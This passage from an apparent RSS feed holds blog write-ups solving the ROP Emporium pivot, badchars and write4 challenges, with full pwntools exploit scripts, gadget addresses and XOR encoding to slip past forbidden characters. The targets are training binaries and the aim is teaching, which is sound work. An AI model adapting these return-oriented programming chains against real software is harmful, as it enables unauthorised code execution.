+<p>Notice how there are a few <code>void_function</code>s between <code>ret2win</code> and <code>foothold_function</code>, the function that actually can be called inside our binary. No matter, as I've mentioned before, shared libraries are stored in memory contiguously. All we need is take the addresses of <code>foothold_function</code> and <code>ret2win</code> and subtract them. This way, we'll obtain the offset between the two functions. Let's go back to our script:</p>
+<pre><code>LIBPIVOT_RET2WIN_FUNCTION_ADDRESS = 0x0000000000000a81
+LIBPIVOT_FOOTHOLD_FUNCTION_ADDRESS = 0x000000000000096a
+
+RET2WIN_OFFSET = LIBPIVOT_RET2WIN_FUNCTION_ADDRESS - LIBPIVOT_FOOTHOLD_FUNCTION_ADDRESS
+</code></pre>
+<p>With this, we can start writing the second payload, the one in the pivot address. Let's start by calling <code>foothold_function</code>. Before that, however, let's remember that the address in <code>LIBPIVOT_FOOTHOLD_FUNCTION_ADDRESS</code> won't work for this, because it's the address of the function <em>inside</em> the library itself. We need to take the address from <code>info functions</code> in the <code>pivot</code> binary:</p>
+<pre><code>FOOTHOLD_FUNCTION_ADDRESS = 0x0000000000400720
+
+pivot_payload = p64(FOOTHOLD_FUNCTION_ADDRESS)
+</code></pre>
+<p>Notice how we don't need an offset for this payload. This makes sense, because even if we've pivoted, we're still in the same ROP chain, so we can keep returning to other gadgets without an offset.</p>
+<p>Let's see what happens if we call this function. Since we'll be using this very script to provide input for the binary, let's add the code for that:</p>
+<pre><code>p.sendlineafter(b">", pivot_payload)
+p.sendlineafter(b">", first_payload)
+p.interactive()
+</code></pre>
+<p>In this case,  we send input to the binary when the character <code>></code> shows in the output. We send the pivot payload first because the the binary says so, and then the buffer overflow payload. <code>p.interactive()</code> is used to allow us to interact with the binary ourselves after introducing the inputs. This will allow us to see what happens after. Let's see what happens when we run the script:</p>
+<pre><code>$ python3 exploit.py
+[*] Switching to interactive mode
+ Thank you!
+foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot
+[*] Got EOF while reading in interactive
+</code></pre>
+<p>Interesting. <code>foothold_function</code> printed out that we need to check the <code>.got.plt</code> entry to gain a foothold into <code>libpivot</code>. That's exactly what we need. But what's <code>.got.plt</code>? Well, it all comes down to the way library functions are linked into binaries.</p>
+<h2>Linking functions from libraries</h2>
+<p>When we use a shared library in a program, the functions from the library don't get copied into the binary just like that. ELF binaries use a process called <strong>Lazy Linking</strong> to only create pointers to library functions when they're needed. The <strong>GOT</strong> is used for that. The GOT (Global Offset Table) will end up containing the pointers to the external functions that are called in the binary.</p>
+<p>When we call an external function, we don't call its pointer directly, we ask the <strong>PLT</strong> (Procedure Linkage Table), which manages the references for us and performs the lazy linking.</p>
+<p>Admittedly, this is a bit dense to explain in a writeup. If you want to learn more, I suggest <a href="https://can-ozkan.medium.com/got-vs-plt-in-binary-analysis-888770f9cc5a">this wonderful article</a> that goes around everything you need to know. But as a TL;DR, in order to use the offset to jump into <code>ret2win</code>, first we need to know the <em>actual</em> address of <code>foothold_function</code>. This function is "unlocked" the first time we call it, when the lazy linking is performed.</p>
+<p>What we need to do is to store in what address will the real pointer to <code>foothold_function</code> be. We can check it running the program and executing the <code>got</code> command:</p>
+<pre><code>$ python3 exploit.py
+pwndbg> got
+...
+[0x601040] foothold_function -> 0x400726 (foothold_function@plt+6) &#x3C;- push rbg
+...
+</code></pre>
+<p>That's the address! Let's add it to a variable:</p>
+<pre><code>FOOTHOLD_FUNCTION_GOT_ADDRESS = 0x601040
+</code></pre>
+<p>When we call <code>foothold_function</code> for the first time, its real pointer will be stored in this address. Let's use the gadgets we have to store in <code>rax</code> that "real" address.</p>
+<pre><code>pivot_payload = p64(FOOTHOLD_FUNCTION_ADDRESS) # we call it once to "unlock" the real address
+pivot_payload += p64(POP_RAX_GADGET_ADDRESS)
+pivot_payload += p64(FOOTHOLD_FUNCTION_GOT_ADDRESS)
+pivot_payload += p64(MOV_RAX_RAX_GADGET_ADDRESS)
+</code></pre>
+<p>First, we pop into <code>rax</code> the GOT entry for <code>foothold_function</code>. Since we've called <code>foothold_function</code> once already, the real address will be there by now. So with the <code>mov rax, [rax]; ret</code> gadget, we store it in <code>rax</code>.</p>
+<p>Supposedly, the address to <code>ret2win</code> should be in the address of <code>foothold_function</code> + <code>RET2WIN_OFFSET</code> . We need to perform that addition in our code. Luckily, we have a gadget just for that: <code>add rax, rbp; ret</code>. We just need to populate the register with both operands:</p>
+<pre><code>pivot_payload += p64(POP_RBP_GADGET_ADDRESS)
+pivot_payload += p64(RET2WIN_OFFSET)
+</code></pre>
+<p>Now, we have the <code>foothold_function</code> real address in <code>rax</code> and the <code>ret2win</code> offset in <code>rbp</code>. We just need to call the <code>add</code> gadget:</p>
+<pre><code>pivot_payload += p64(_ADD_RAX_RBP_GADGET_ADDRESS)
+</code></pre>
+<p>Awesome! Now we have the address of <code>ret2win</code> in <code>rax</code>. Now we just need to call it. Luckily for us, by using <code>rop</code>, we can find a <code>call rax; ret</code>  gadget. This gadget will just call the function in the address located in <code>rax</code>. It's perfect:</p>
+<pre><code>CALL_RAX_GADGET_ADDRESS = 0x4006b0
+
+...
+
+pivot_payload += p64(CALL_RAX_GADGET_ADDRESS)
+</code></pre>
+<p>That should do! Here's the full code:</p>
+<pre><code>from pwn import *
+
+elf = context.binary = ELF("./pivot", checksec=False)
+p = process(elf.path)
+
+p.recvuntil(b"pivot: ")
+PIVOT_STACK_ADDRESS = int(p.recvline(), 16)
+
+OFFSET = 40
+
+POP_RAX_GADGET_ADDRESS = 0x004009bb
+XCHG_RSP_RAX_GADGET_ADDRESS = 0x004009bd
+MOV_RAX_RAX_GADGET_ADDRESS = 0x004009c0
+ADD_RAX_RBP_GADGET_ADDRESS = 0x004009c4
+POP_RBP_GADGET_ADDRESS = 0x004007c8
+CALL_RAX_GADGET_ADDRESS = 0x4006b0
+
+LIBPIVOT_RET2WIN_FUNCTION_ADDRESS = 0x0000000000000a81
+LIBPIVOT_FOOTHOLD_FUNCTION_ADDRESS = 0x000000000000096a
+FOOTHOLD_FUNCTION_ADDRESS = 0x0000000000400720
+FOOTHOLD_FUNCTION_GOT_ADDRESS = 0x601040
+
+RET2WIN_OFFSET = LIBPIVOT_RET2WIN_FUNCTION_ADDRESS - LIBPIVOT_FOOTHOLD_FUNCTION_ADDRESS
+
+first_payload = b"A" * OFFSET
+first_payload += p64(POP_RAX_GADGET_ADDRESS)
+first_payload += p64(PIVOT_STACK_ADDRESS)
+first_payload += p64(XCHG_RSP_RAX_GADGET_ADDRESS)
+
+pivot_payload = p64(FOOTHOLD_FUNCTION_ADDRESS)
+
+pivot_payload = p64(FOOTHOLD_FUNCTION_ADDRESS) # we call it once to "unlock" the real address
+pivot_payload += p64(POP_RAX_GADGET_ADDRESS)
+pivot_payload += p64(FOOTHOLD_FUNCTION_GOT_ADDRESS)
+pivot_payload += p64(MOV_RAX_RAX_GADGET_ADDRESS)
+pivot_payload += p64(POP_RBP_GADGET_ADDRESS)
+pivot_payload += p64(RET2WIN_OFFSET)
+pivot_payload += p64(ADD_RAX_RBP_GADGET_ADDRESS)
+pivot_payload += p64(CALL_RAX_GADGET_ADDRESS)
+
+p.sendlineafter(b">", pivot_payload)
+p.sendlineafter(b">", first_payload)
+p.interactive()
+</code></pre>
+<p>Since we don't need pwndbg anymore, I changed the process to execute the raw binary, without GDB. Let's run the script:</p>
+<pre><code>$ python3 exploit.py
+Thank you!
+foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot
+ROPE{a_placeholder_32byte_flag!}
+[*] Got EOF while reading in interactive
+$
+</code></pre>
+]]></description>
+            <link>https://markelmencia.com/writeups/rop-emporium-pivot-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.com/writeups/rop-emporium-pivot-writeup</guid>
+            <pubDate>Sun, 28 Dec 2025 00:00:00 GMT</pubDate>
+        </item>
+        <item>
+            <title><![CDATA[ROP Emporium x86-64 Challenge 5: badchars]]></title>
+            <description><![CDATA[<h1>ROP Emporium x86-64 Challenge 5: badchars</h1>
+<h4>December 27, 2025</h4>
+<p>This challenge was odd. Not necessarily very difficult, but kinda weird to work with. We are told that this binary will not allow certain characters. This means that we won't be able input some specific characters to strings, parameters or addresses, at least not directly. When we run the program, we can see which will be the bad characters:</p>
+<pre><code>$ ./badchars
+badchars by ROP Emporium
+x86_64
+
+badchars are: 'x', 'g', 'a', '.'
+</code></pre>
+<p>Great, so we can't really write <code>flag.txt</code> anywhere... or can we?</p>
+<p>This challenge is a glorified version of the <a href="rop-emporium-write4-writeup">previous challenge</a>, write4. We'll need to call <code>print_file</code> with the argument <code>flag.txt</code>, just like in write4. The issue is that we won't be able to write that string directly, because as we can see, it contains badchars.</p>
+<p>Our goal is to somehow avoid this restriction indirectly.  We'll see along the way. For now, let's see what we can work with:</p>
+<pre><code>pwndbg> info functions
+0x00000000004004d8  _init
+0x0000000000400500  pwnme@plt
+0x0000000000400510  print_file@plt
+0x0000000000400520  _start
+0x0000000000400550  _dl_relocate_static_pie
+0x0000000000400560  deregister_tm_clones
+0x0000000000400590  register_tm_clones
+0x00000000004005d0  __do_global_dtors_aux
+0x0000000000400600  frame_dummy
+0x0000000000400607  main
+0x0000000000400617  usefulFunction
+0x0000000000400628  usefulGadgets
+0x0000000000400640  __libc_csu_init
+0x00000000004006b0  __libc_csu_fini
+0x00000000004006b4  _fini
+</code></pre>
+<p>Literally the same functions as in the last challenge. Let's see what g
+adgets we are given:</p>
+<pre><code>pwndbg> disas usefulGadgets
+   0x0000000000400628 &#x3C;+0>:	xor    BYTE PTR [r15],r14b
+   0x000000000040062b &#x3C;+3>:	ret
+   0x000000000040062c &#x3C;+4>:	add    BYTE PTR [r15],r14b
+   0x000000000040062f &#x3C;+7>:	ret
+   0x0000000000400630 &#x3C;+8>:	sub    BYTE PTR [r15],r14b
+   0x0000000000400633 &#x3C;+11>:	ret
+   0x0000000000400634 &#x3C;+12>:	mov    QWORD PTR [r13+0x0],r12
+   0x0000000000400638 &#x3C;+16>:	ret
+   0x0000000000400639 &#x3C;+17>:	nop    DWORD PTR [rax+0x0]
+</code></pre>
+<p>Okay...! We're given a few.</p>
+<p>The one that seems quirky is that <code>xor [r15], r14b; ret</code> gadget. Either way, it's there for a reason, right? Chances are we'll have to use it to write in memory.</p>
+<p>Let's not forget about the <code>mov [r13], r12; ret</code> gadget, though. This gadget, just like in the previous challenge, allows us to write the value of <code>r12</code> into the address stored in <code>r13</code>.</p>
+<p>These gadgets work with the <code>r15</code>, <code>r14</code>, <code>r13</code> and <code>r12</code> registers, so let's see if there's any other gadget that allows us to pop values into these registers with the <code>rop</code> command:</p>
+<pre><code>pwndbg> rop
+...
+0x0040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+...
+</code></pre>
+<p>Jackpot, literally a perfect gadget that makes us able to have enough control to write arbitrary values in memory and <code>XOR</code> them.</p>
+<h2>The use of the XOR operation</h2>
+<p>You might wonder what use does the <code>xor</code> gadget have. Before we see it, let's do a refresher on how the XOR operation works.</p>
+<p>XOR comes from <strong>eXclusive OR</strong>. Esentially, if you work with two inputs, it will output a <code>1</code> if said inputs are different, and a <code>0</code> otherwise. Here's the truth table for it:</p>
+<p>| A | B | Out |
+|---|---|-----|
+| 0 | 0 | 0   |
+| 0 | 1 | 1   |
+| 1 | 0 | 1   |
+| 1 | 1 | 0   |
+The XOR operation has a nice property. <strong>Its inverse operation is the XOR operation itself</strong>. This is handy to encode data, because inverting it is computationally easy. Let's see an example:</p>
+<pre><code>A = 123321
+B = 456654
+A XOR B = 464503
+
+464503 XOR B = 123321 = A
+464503 XOR A = 456654 = B
+</code></pre>
+<p>Why is this useful, though? Well, XOR works wonders to transform data! We can input a sequence to the binary with no bad characters (to avoid the restriction) and then, once it's inside the memory, transform it with XOR to have the actual string we want with bad characters inside the memory! Let's see it with an example:</p>
+<pre><code>0x7478742E67616C66
+</code></pre>
+<p>This is <code>flag.txt</code> in ASCII. If we try to input this into the memory, it won't work, because it has bad characters: <code>0x78</code>, <code>0x67</code>, <code>0x61</code> and <code>0x2E</code>, translated to its ASCII characters, are <code>x</code>, <code>g</code>, <code>a</code> and <code>.</code> respectively. We were told by the binary that these were badchars. However, let's XOR it with an arbitrary value:</p>
+<pre><code>0x7478742E67616C66 XOR 0xFEFEFEFEFEFEFEFE
+= 0x8A868AD0999F9298
+</code></pre>
+<p>This value has no bad characters, meaning that it can be used as input with no issues. Then, when it's already in memory, we can transform it with a reverse XOR operation:</p>
+<pre><code>0x8A868AD0999F9298 XOR 0xFEFEFEFEFEFEFEFE
+= 0x7478742E67616C66
+</code></pre>
+<p>This will allow us to have <code>flag.txt</code> stored in memory! That's the key for this challenge. The only thing we need to worry about is to ensure that the key we use (in my case <code>0xFEFEFEFEFEFEFEFE</code>) doesn't create a value that also badchars. This can happen, in fact it happened with <code>0xFFFFFFFFFFFFFFFF</code>, which is the first key I tried. However, it's not very likely and you can always easily find a key that works by trial and error. However, some more advanced tools exists for use cases like these, like the <a href="https://github.com/EgeBalci/sgn">shikata ga nai encoder</a>.</p>
+<p>With a working XOR key, now we can almost start building the payload. However, there's an issue.</p>
+<h2>Finding the offset</h2>
+<p>Up until this challenge, I've been using the <code>cyclic</code> command to find the offset of the return address. <code>cyclic</code> creates a pattern string that we can find offsets of pretty easily later. However, since that pattern might have badchars in it, we'll tell <code>cyclic</code> explicitly what characters can it use:</p>
+<pre><code>pwndbg> cyclic 200 pat -a bcd
+</code></pre>
+<p>With the <code>-a</code> option, we can specify an alphabet. A set of characters that will be used by <code>cylic</code> to generate the pattern string. Since both <code>b</code>, <code>c</code> and <code>d</code> are not badchars, this pattern will do.</p>
+<p>Now, we run the program with this pattern as input:</p>
+<pre><code>pwndbg> run &#x3C; pat
+</code></pre>
+<p>The return address has this value in it:</p>
+<pre><code>0x7ffff7c00a06 &#x3C;pwnme+268>    ret    &#x3C;0x6462626262626263>
+</code></pre>
+<p>We can get the offset like this:</p>
+<pre><code>pwndbg> cyclic -l 0x6462626262626263 -a bcd
+Finding cyclic pattern of 8 bytes: b'cbbbbbbd'
+Found at offset 40
+</code></pre>
+<p>To no one's surprise, the offset is still 40. Still, at least we've learned how to create badchar-safe pattern strings!</p>
+<p>Now that we've ensured what the offset is, we can begin writing the exploit.</p>
+<pre><code>from pwn import *
+
+OFFSET = 40
+
+RET_INSTRUCTION_ADDRESS = 0x004004ee
+XOR_R15_R14_GADGET_ADDRESS = 0x00400628
+POP_R12_R13_R14_R15_GADGET_ADDRESS = 0x0040069c
+MOV_R12_TO_R13_GADGET_ADDRESS = 0x00400634
+POP_R15_GADGET_ADDRESS = 0x004006a2
+POP_RDI_GADGET_ADDRESS = 0x004006a3
+
+PRINT_FILE_FUNCTION_ADDRESS = 0x00400510
+BSS_ADDRESS = 0x00601038
+</code></pre>
+<p>This is a good start. I've also added a <code>pop r15; ret</code> gadget I've found, that will be useful for us later.</p>
+<p>Now let's apply the XOR trick I mentioned earlier. Let's encode <code>flag.txt</code> to avoid badchars:</p>
+<pre><code>FLAG_HEX = 0x7478742E67616C66
+XOR_KEY = 0xFEFEFEFEFEFEFEFE
+
+FLAG_XOR = FLAG_HEX ^ XOR_KEY
+</code></pre>
+<p>In Python, the <code>^</code> operator will perform a XOR, so now we have the encoded value stored in <code>FLAG_XOR</code>.</p>
+<p>Let's start with the ROP chain. First, let's review the two most important gadgets:</p>
+<pre><code>0x0000000000400628 &#x3C;+0>:	xor    BYTE PTR [r15],r14b
+0x000000000040062b &#x3C;+3>:	ret
+   
+0x0000000000400634 &#x3C;+12>:	mov    QWORD PTR [r13+0x0],r12
+0x0000000000400638 &#x3C;+16>:	ret
+</code></pre>
+<p>The XOR operation will be performed in the memory address that <code>r15</code> points to. In <code>r14</code>, we'll have to store the key we used, <code>0xFEFEFEFEFEFEFEFE</code>, that is. In <code>r15</code>, the address to <code>.bss</code> (which can be found with <code>info files</code>).</p>
+<p>To store data in memory, we'll use the <code>move [r13], r12; ret</code> gadget, which stores the value of <code>r12</code> in the memory address stored in <code>r13</code>. Just like in the previous challenge, we'll want to write <code>flag.txt</code> in the <code>.bss</code> section, in which we have write permissions. Thus, the <code>.bss</code> address will be stored in <code>r13</code>, and the encoded "flag.txt" string will be stored in <code>r12</code>.</p>
+<p>To load values into all these registers, we can use the <code>pop r12; pop r13; pop r14; pop r15; ret</code> gadget we've found before. So, after also setting up the offset and aligning the stack with a return gadget, we can begin populating the registers:</p>
+<pre><code>payload = b"B"*OFFSET
+payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
+payload += p64(POP_R12_R13_R14_R15_GADGET_ADDRESS)
+payload += p64(FLAG_XOR) # r12
+payload += p64(BSS_ADDRESS) # r13
+payload += p64(XOR_KEY) # r14
+payload += p64(BSS_ADDRESS) # r15
+</code></pre>
+<p>Now nothing stops us from storing the encoded flag in <code>.bss</code> with the <code>mov</code> gadget:</p>
+<pre><code>payload = b"B"*OFFSET
+payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
+payload += p64(POP_R12_R13_R14_R15_GADGET_ADDRESS)
+payload += p64(FLAG_XOR) # r12
+payload += p64(BSS_ADDRESS) # r13
+payload += p64(XOR_KEY) # r14
+payload += p64(BSS_ADDRESS) # r15
+payload += p64(MOV_R12_TO_R13_GADGET_ADDRESS)
+</code></pre>
+<p>Now that the encoded flag is stored in memory, all we need is to decode it with the <code>xor</code> gadget. However, up until now I've been overlooking a slight but very important detail of the gadget. Let's take a look at it again:</p>
+<pre><code>0x0000000000400628 &#x3C;+0>:	xor    BYTE PTR [r15],r14b
+0x000000000040062b &#x3C;+3>:	ret
+</code></pre>
+<p>Take a look at the registers. There's a "b" in <code>r14</code>. This is actually a bit of an issue, because that "b" means that the instruction will only read one byte from the instruction. So instead of decoding with the key <code>0xFEFEFEFEFEFEFEFE</code>, it will decode it with <code>0xFE</code>. This means that it will only decode one character out of the eight in <code>flag.txt</code>. That's a bummer.</p>
+<p>However, to our benefit, this has a fix. We can just iterate over every byte in <code>.bss</code> where <code>flag.txt</code> is stored. Ffoor every character, we'll perform the XOR operation, byte by byte. Once the for loop is done, the whole string will be decoded, and <code>flag.txt</code> will sit inside <code>.bss</code>. Let's see how we can do this:</p>
+<pre><code>for i in range(8): # Length of "flag.txt"
+	payload += p64(POP_R15_GADGET_ADDRESS)
+	payload += p64(BSS_ADDRESS + i)
+	payload += p64(XOR_R15_R14_GADGET_ADDRESS)
+</code></pre>
+<p>This does it. The loop will iterate over every byte of the string and decode it to obtain <code>flag.txt</code>.</p>
+<p>Now the exploit is ready! We just need to pop the <code>.bss</code> address into <code>rdi</code> to set up the argument for <code>print_file</code>. Here's the whole script:</p>
+<pre><code>from pwn import *
+
+OFFSET = 40
+
+RET_INSTRUCTION_ADDRESS = 0x004004ee
+XOR_R15_R14_GADGET_ADDRESS = 0x00400628
+POP_R12_R13_R14_R15_GADGET_ADDRESS = 0x0040069c
+MOV_R12_TO_R13_GADGET_ADDRESS = 0x00400634
+POP_R15_GADGET_ADDRESS = 0x004006a2
+POP_RDI_GADGET_ADDRESS = 0x004006a3
+
+PRINT_FILE_FUNCTION_ADDRESS = 0x00400510
+BSS_ADDRESS = 0x00601038
+
+FLAG_HEX = 0x7478742E67616C66
+XOR_KEY = 0xFEFEFEFEFEFEFEFE
+
+FLAG_XOR = FLAG_HEX ^ XOR_KEY
+
+payload = b"B"*OFFSET
+payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
+payload += p64(POP_R12_R13_R14_R15_GADGET_ADDRESS)
+payload += p64(FLAG_XOR) # r12
+payload += p64(BSS_ADDRESS) # r13
+payload += p64(XOR_KEY) # r14
+payload += p64(BSS_ADDRESS) # r15
+payload += p64(MOV_R12_TO_R13_GADGET_ADDRESS)
+for i in range(8): # Length of "flag.txt"
+	payload += p64(POP_R15_GADGET_ADDRESS)
+	payload += p64(BSS_ADDRESS + i)
+	payload += p64(XOR_R15_R14_GADGET_ADDRESS)
+payload += p64(POP_RDI_GADGET_ADDRESS)
+payload += p64(BSS_ADDRESS)
+payload += p64(PRINT_FILE_FUNCTION_ADDRESS)
+
+open("exploit", "bw").write(payload)
+</code></pre>
+<p>To run it, we run the script with Python and then use the generated file as input for the binary:</p>
+<pre><code>$ python3 exploit.py
+./badchars &#x3C; exploit
+badchars by ROP Emporium
+x86_64
+
+badchars are: 'x', 'g', 'a', '.'
+> Thank you!
+ROPE{a_placeholder_32byte_flag!}
+Segmentation fault
+</code></pre>
+]]></description>
+            <link>https://markelmencia.com/writeups/rop-emporium-badchars-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.com/writeups/rop-emporium-badchars-writeup</guid>
+            <pubDate>Sat, 27 Dec 2025 00:00:00 GMT</pubDate>
+        </item>
+        <item>
+            <title><![CDATA[ROP Emporium x86-64 Challenge 4: write4]]></title>
+            <description><![CDATA[<h1>ROP Emporium x86-64 Challenge 4: write4</h1>
+<h4>December 27, 2025</h4>
+<p>For this challenge, we'll have to call a function called <code>print_file</code> that lies somewhere in the binary. This function will print the content of the file it receives as an argument, in the form of a path. However, we are told that there are no special strings we can use to call <code>print_file</code>, which means that we'll have to create it ourselves and store it in memory, hence the name of the challenge.</p>
+<h2>Looking for tools</h2>
+<p>To start, let's perform the routine we've done for the other challenges:</p>
+<pre><code>pwndbg> info functions
+0x00000000004004d0  _init
+0x0000000000400500  pwnme@plt
+0x0000000000400510  print_file@plt
+0x0000000000400520  _start
+0x0000000000400550  _dl_relocate_static_pie
+0x0000000000400560  deregister_tm_clones
+0x0000000000400590  register_tm_clones
+0x00000000004005d0  __do_global_dtors_aux
+0x0000000000400600  frame_dummy
+0x0000000000400607  main
+0x0000000000400617  usefulFunction
+0x0000000000400628  usefulGadgets
+0x0000000000400630  __libc_csu_init
+0x00000000004006a0  __libc_csu_fini
+0x00000000004006a4  _fini
+</code></pre>
+<p>We still have our usual <code>usefulFunction</code> and <code>usefulGadgets</code> functions, along with <code>print_file</code>.</p>
+<pre><code>pwndbg> disas usefulFunction
+   0x0000000000400617 &#x3C;+0>:	    push   rbp
+   0x0000000000400618 &#x3C;+1>:	    mov    rbp,rsp
+   0x000000000040061b &#x3C;+4>:	    mov    edi,0x4006b4
+   0x0000000000400620 &#x3C;+9>:	    call   0x400510 &#x3C;print_file@plt>
+   0x0000000000400625 &#x3C;+14>:	nop
+   0x0000000000400626 &#x3C;+15>:	pop    rbp
+   0x0000000000400627 &#x3C;+16>:	ret
+</code></pre>
+<p>Disassembling <code>usefulFunction</code> makes us see how we need to call <code>print_file</code>. The register <code>edi</code> should contain the pointer to the string with the path to the file we want to open. However, the pointer that function uses doesn't have a valid path:</p>
+<pre><code>pwndbg> x/s 0x4006b4
+0x4006b4:	"nonexistent"
+</code></pre>
+<p>Our goal is to write in memory the string <code>flag.txt</code>, and store its pointer in <code>edi</code> right before we call <code>print_file</code>. In order to do this, we'll have to use gadgets, just like in the other challenges. Let's see what we're given in <code>usefulGadgets</code>:</p>
+<pre><code>pwndbg> disas usefulGadgets
+   0x0000000000400628 &#x3C;+0>:	mov    QWORD PTR [r14],r15
+   0x000000000040062b &#x3C;+3>:	ret
+   0x000000000040062c &#x3C;+4>:	nop    DWORD PTR [rax+0x0]
+</code></pre>
+<p>For now on, if you're given a gadget with which you can write to memory, smile. That's the case in this challenge. <code>mov [r14], r15</code> will store whatever value is in <code>r15</code> in the memory address stored in <code>r14</code>, like this:</p>
+<pre><code>r14 = 0xAEAE
+r15 = 0xCAFE
+
+BEFORE THE MOV INSTRUCTION:
+0xAEAE: 0xBEEF
+
+AFTER THE MOV INSTRUCTION:
+0xAEAE: 0xCAFE
+</code></pre>
+<p>All we need is to find a <code>pop</code> gadget that allows us to write in <code>r14</code> and <code>r15</code>. Let's hunt for gadgets with the <code>rop</code> command:</p>
+<pre><code>pwndbg> rop
+...
+0x0040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0040068e : pop r13 ; pop r14 ; pop r15 ; ret
+0x00400690 : pop r14 ; pop r15 ; ret
+0x00400692 : pop r15 ; ret
+0x00400604 : pop rbp ; jmp 0x400590
+0x0040057b : pop rbp ; mov edi, 0x601038 ; jmp rax
+0x0040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0040068f : pop rbp ; pop r14 ; pop r15 ; ret
+0x00400588 : pop rbp ; ret
+0x00400693 : pop rdi ; ret
+...
+</code></pre>
+<p>Awesome! In <code>0x00400690</code>, there's indeed a gadget that will pop two values in the stack and store them in <code>r14</code> and <code>r15</code>. Ultimately, we have more than enough resources to write arbitrary values in memory.</p>
+<h2>Choosing a write address</h2>
+<p>We're almost ready to go. However, a very valid question to ask right now is in what address should we write in. A random one will not work most likely, because some areas are read-only.</p>
+<p>An area that we'll always have access to write to is the <code>.bss</code> segment of the binary. In ELF binaries, the <code>.bss</code>  segment is used to store variables that have been declared but not initialized yet. This area is writeable, and we can use it to write <code>flag.txt</code> in memory.</p>
+<p>To know where is this area allocated, we can use the <code>info files</code> command. This command will print out all the memory segments of the binary and its address ranges:</p>
+<pre><code>pwndbg> info files
+0x0000000000400238 - 0x0000000000400254 is .interp
+0x0000000000400254 - 0x0000000000400274 is .note.ABI-tag
+0x0000000000400274 - 0x0000000000400298 is .note.gnu.build-id
+0x0000000000400298 - 0x00000000004002d0 is .gnu.hash
+0x00000000004002d0 - 0x00000000004003c0 is .dynsym
+0x00000000004003c0 - 0x000000000040043c is .dynstr
+0x000000000040043c - 0x0000000000400450 is .gnu.version
+0x0000000000400450 - 0x0000000000400470 is .gnu.version_r
+0x0000000000400470 - 0x00000000004004a0 is .rela.dyn
+0x00000000004004a0 - 0x00000000004004d0 is .rela.plt
+0x00000000004004d0 - 0x00000000004004e7 is .init
+0x00000000004004f0 - 0x0000000000400520 is .plt
+0x0000000000400520 - 0x00000000004006a2 is .text
+0x00000000004006a4 - 0x00000000004006ad is .fini
+0x00000000004006b0 - 0x00000000004006c0 is .rodata
+0x00000000004006c0 - 0x0000000000400704 is .eh_frame_hdr
+0x0000000000400708 - 0x0000000000400828 is .eh_frame
+0x0000000000600df0 - 0x0000000000600df8 is .init_array
+0x0000000000600df8 - 0x0000000000600e00 is .fini_array
+0x0000000000600e00 - 0x0000000000600ff0 is .dynamic
+0x0000000000600ff0 - 0x0000000000601000 is .got
+0x0000000000601000 - 0x0000000000601028 is .got.plt
+0x0000000000601028 - 0x0000000000601038 is .data
+0x0000000000601038 - 0x0000000000601040 is .bss
+</code></pre>
+<p>The last one is <code>.bss</code>, as you can see. Let's note down its address.</p>
+<p>Now we're actually ready to go, let's build our payload!</p>
+<h2>The payload</h2>
+<p>Just like in the other challenges, we'll build a Python script with the help of pwntools. Let's start with the variables:</p>
+<pre><code>from pwn import *
+
+OFFSET = 40
+
+RET_INSTRUCTION_ADDRESS = 0x004004e6
+MOV_R15_TO_R14_GADGET_ADDRESS = 0x00400628
+POP_R14_POP_R15_GADGET_ADDRESS = 0x00400690
+POP_RDI_GADGET_ADDRESS = 0x00400693
+
+PRINT_FILE_FUNCTION_ADDRESS = 0x0000400510
+BSS_ADDRESS = 0x00601038
+</code></pre>
+<p>The offset was obtained just like in the other challenges. I've gotten the gadget addresses from our disassemble commands earlier and the <code>rop</code> command. I've added a <code>pop rdi; ret</code> gadget I've found too, which we'll need to write into <code>rdi</code> the address to <code>flag.txt</code> I've also stored the address to the <code>print_file</code> function and our <code>.bss</code> starting point address. Let's start with the payload:</p>
+<pre><code>payload = b"A"*OFFSET
+payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
+</code></pre>
+<p>As always, first we add in the garbage characters that allow us to reach the return address offset. Then, we align the stack with a <code>ret</code> gadget, just to be safe.</p>
+<p>Now, we need to write into memory. For that we've found the <code>mov [r14], r15</code> gadget, but first we need to populate the <code>r14</code> and <code>r15</code> registers with the <code>.bss</code> address and the <code>flag.txt</code> text. We can do that with the other important gadget we've found, the <code>pop r14; pop r15; ret</code> gadget:</p>
+<pre><code>payload = b"A"*OFFSET
+payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
+payload += p64(POP_R14_POP_R15_GADGET_ADDRESS)
+payload += p64(BSS_ADDRESS)
+payload += b"flag.txt"
+</code></pre>
+<p>This will do. Now that the registers contain the appropriate values, we can actually execute the <code>mov</code> gadget.</p>
+<pre><code>payload = b"A"*OFFSET
+payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
+payload += p64(POP_R14_POP_R15_GADGET_ADDRESS)
+payload += p64(BSS_ADDRESS)
+payload += b"flag.txt"
+payload += p64(MOV_R15_TO_R14_GADGET_ADDRESS)
+</code></pre>
+<p>By this point, we will have already written <code>flag.txt</code> into the <code>.bss</code> segment. We're pretty much done! All we need to do now is pop into the <code>rdi</code> register the address to <code>.bss</code>. This register will be used as the pointer to the string <code>print_file</code> will use as an argument to print the flag, so after that we can just call <code>print_file</code>:</p>
+<pre><code>payload = b"A"*OFFSET
+payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
+payload += p64(POP_R14_POP_R15_GADGET_ADDRESS)
+payload += p64(BSS_ADDRESS)
+payload += b"flag.txt"
+payload += p64(MOV_R15_TO_R14_GADGET_ADDRESS)
+payload += p64(POP_RDI_GADGET_ADDRESS)
+payload += p64(BSS_ADDRESS)
+payload += p64(PRINT_FILE_FUNCTION_ADDRESS)
+</code></pre>
+<p>That should do! Now we just need to write the payload into a file and use it as input for the binary. Here's the full script:</p>
+<pre><code>from pwn import *
+
+OFFSET = 40
+
+RET_INSTRUCTION_ADDRESS = 0x004004e6
+MOV_R15_TO_R14_GADGET_ADDRESS = 0x00400628
+POP_R14_POP_R15_GADGET_ADDRESS = 0x00400690
+POP_RDI_GADGET_ADDRESS = 0x00400693
+
+PRINT_FILE_FUNCTION_ADDRESS = 0x0000400510
